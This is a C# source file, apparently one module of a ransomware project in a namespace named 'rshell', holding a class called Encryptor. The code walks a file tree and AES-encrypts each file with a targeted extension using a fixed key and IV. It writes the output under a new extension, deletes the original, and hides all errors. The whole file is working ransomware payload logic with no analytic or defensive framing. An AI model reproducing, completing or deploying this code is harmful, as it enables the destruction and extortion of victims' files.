using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;

namespace rshell
{
    internal static class Encryptor
    {
        private static Aes aes;
        private static int read;
        private static byte[] buffer = new byte[Settings.bufferSize];

        public static void Encrypt()
        {
            using (aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.Zeros;
                aes.KeySize = 128;
                aes.IV = Settings.iv;
                aes.Key = Settings.key;

                Utils.EnumerateFiles(EncryptFile);
            }
        }

        private static void EncryptFile(string path)
        {
            if (!Utils.IsTargetedExtension(path))
                return;

            try
            {

                using (var original = File.Open(path, FileMode.Open, FileAccess.Read))
                {
                    using (var encrypted = File.Open(path + Settings.extension, FileMode.Create, FileAccess.Write))
                    {
                        using (var transform = aes.CreateEncryptor())
                        {
                            using (var crypto = new CryptoStream(encrypted, transform, CryptoStreamMode.Write))
                            {
                                while ((read = original.Read(buffer, 0, buffer.Length)) != 0)
                                {
                                    crypto.Write(buffer, 0, read);
                                }
                            }
                        }
                    }
                }


            File.Delete(path);
            }
            catch (Exception ex)
            {

            }
        }
    }
}
